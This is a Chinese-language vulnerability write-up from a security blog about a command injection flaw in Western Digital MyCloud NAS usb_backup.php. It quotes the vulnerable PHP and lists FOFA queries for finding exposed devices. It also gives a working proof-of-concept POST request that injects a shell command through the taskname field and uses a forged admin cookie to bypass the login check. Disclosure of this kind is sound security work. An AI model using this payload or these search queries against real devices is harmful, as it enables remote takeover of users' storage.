---
title: "西部数码 NAS usb_backup.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-usb_backup-rce.html
asset_dir: assets/西部数码-nas-usb_backup.php-命令执行漏洞
---

# 西部数码 NAS usb\_backup.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/9/8 12:48
- 510浏览
- [0评论](#comment)
- 54分钟阅读

深入探索

网络安全会议

JSON处理工具

漏洞扫描器

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS usb\_backup.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞修复方案

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

直接看 `usb_backup.php` 其业务实现逻辑如下

```
<?php
session_start();
$r = new stdClass();
$r->success = false;

include ("../lib/login_checker.php");

/* login_check() return 0: no login, 1: login, admin, 2: login, normal user */
if (login_check() != 1)
{
    echo json_encode($r);
    exit;
}

define('USB_BACKUPS_CONF', '/var/www/xml/usb_backup.xml');

$action = $_POST['action'];
if ($action == "") $action = $_GET['action'];
......
switch ($action)
{
    case "create":
    {
       $taskname = $_POST['taskname'];
       $category = $_POST['category']; //1:USB->NAS,2:NAS->USB
       $source_dir = $_POST['source_dir'];
       $dest_dir = $_POST['dest_dir'];
       $backup_type = $_POST['backup_type'];
       $auto_start = $_POST['auto_start'];

       $cmd = sprintf("usb_backup -a '%s' -m %s -t %s -d %s -A %s -c jobadd",
                   $taskname, $backup_type, $category, escapeshellarg(htmlstr_decode($dest_dir)), $auto_start);

       foreach ($source_dir as $val)
          $cmd .= sprintf(" -s %s", escapeshellarg(htmlstr_decode($val)));

       pclose(popen($cmd, 'r'));
       $pname = sprintf("/tmp/r_usb!_%s", $taskname);
       @unlink($pname);

       stop_job($taskname);

       //Start job
       $cmd = sprintf("usb_backup -a '%s' -c jobrun &", $taskname);
       pclose(popen($cmd, 'r'));
       sleep(2);

       $r = get_list();
       $r->success = true;
       echo json_encode($r);
    }
       break;

    case "modify":
    {
       $taskname = $_POST['taskname'];
       $category = $_POST['category']; //1:USB->NAS,2:NAS->USB
       $source_dir = $_POST['source_dir'];
       $dest_dir = $_POST['dest_dir'];
       $backup_type = $_POST['backup_type'];
       $auto_start = $_POST['auto_start'];
       $old_taskname = $_POST['old_taskname'];

       stop_job($taskname);

       $cmd = sprintf("usb_backup -a '%s' -x '%s' -m %s -t %s -d %s -A %s -c jobedit",
                   $taskname, $old_taskname, $backup_type, $category, escapeshellarg(htmlstr_decode($dest_dir)), $auto_start);

       foreach ($source_dir as $val)
          $cmd .= sprintf(" -s %s", escapeshellarg(htmlstr_decode($val)));

       pclose(popen($cmd, 'r'));

       //Start job
       $cmdS = sprintf("usb_backup -a '%s' -c jobrun &", $taskname);
       pclose(popen($cmdS, 'r'));
       sleep(2);

       $r = get_list();
       $r->cmd = $cmd;
       $r->success = true;
       echo json_encode($r);
    }
       break;

    case "del":
    {
       $taskname = $_POST['taskname'];

       stop_job($taskname);

       $cmd = sprintf("usb_backup -a '%s' -c jobdel", $taskname);
       pclose(popen($cmd, 'r'));

       $pname = sprintf("/tmp/r_%s!_usb", $taskname);
       @unlink($pname);

       $r = get_list();
       $r->success = true;
       echo json_encode($r);
    }
       break;

    case "go_jobs":
    {
       $taskname = $_POST['taskname'];

       $pname = sprintf("/tmp/r_%s!_usb", $taskname);
       @unlink($pname);

       $cmd = sprintf("usb_backup -a '%s' -c jobrun &", $taskname);
       pclose(popen($cmd, 'r'));
       sleep(2);

       $r = get_list();
       $r->success = true;
       echo json_encode($r);
    }
       break;

    case "stop_jobs":
    {
       $taskname = $_POST['taskname'];
       stop_job($taskname);

       $r = get_list();
       $r->success = true;
       echo json_encode($r);
    }
       break;

    case "go_restore":
    {
       $taskname = $_POST['taskname'];
       $restore_source = $_POST['restore_source'];

       stop_job($taskname);

       $pname = sprintf("/tmp/r_%s!_usb", $taskname);
       file_put_contents($pname, "0"); //Cancel

       $list_xml_file = sprintf("/tmp/r_usb!_restore_imcremental_%s.xml", $taskname);
       if ($restore_source == "")//Sync and Copy
          $cmd = sprintf("usb_backup -a '%s' -o '%s' -c jobrs &", $taskname, $list_xml_file);
       else
          $cmd = sprintf("usb_backup -a '%s' -o '%s' -F %s -c jobrs &", $taskname, $list_xml_file, $_POST['restore_source']);
       pclose(popen($cmd, 'r'));
       sleep(2);

       $r = get_list();
       $r->success = true;
       echo json_encode($r);
    }
       break;

    case "get_list":
    {
       $r = get_list();
       $r->success = true;
       echo json_encode($r);
    }
       break;

}
```

当`$_POST['action']` = `create`时，`$taskname = $_POST['taskname']`、`$_POST['backup_type']`、`$_POST['category']`和`$_POST['auto_start']`这几个参数均是直接拼接进$cmd中，然后调用**popen**进行执行，期间对这几个参数没有过滤或校验，导致了[命令注入](https://mrxn.net/tag/rce)漏洞。尽管此漏洞需要管理员权限才能触发，但可以结合`login_check`的权限绕过达到 RCE的效果。

漏洞修复方案

类似的问题同样存在于`del` `go_jobs` `go_restore` `stop_jobs` 和 `modify` 操作中，其中 `$backup_type`, `$category`, `$auto_start` `$restore_source` `$taskname`等参数也未被转义。

[![西部数码 NAS usb_backup.php 命令执行漏洞](images/img-001-b7af74a5b4a5.webp)](https://image.mrxn.net/f6edba94e1a94fc3aa6b657701f840a9.webp)

# 漏洞复现

> 需要注意source\_dir应为数组形式，否则foreach循环判断会出错

```
POST /web/backups/usb_backup.php HTTP/1.1
Host: west-nas.mrxn.ent
Cookie: isAdmin=1;username=admin
Content-Type: application/x-www-form-urlencoded

action=create&taskname=' $(pwd>/var/www/t.png) #' &source_dir[]=
```

[![西部数码 NAS usb_backup.php 命令执行漏洞](images/img-002-3dd264c5d877.webp)](https://image.mrxn.net/9f3d97b46f98424b8809359c78e988e6.webp)

成功[执行命令](https://mrxn.net/tag/rce)并输出结果至测试文件

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#php](https://mrxn.net/tag/php)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
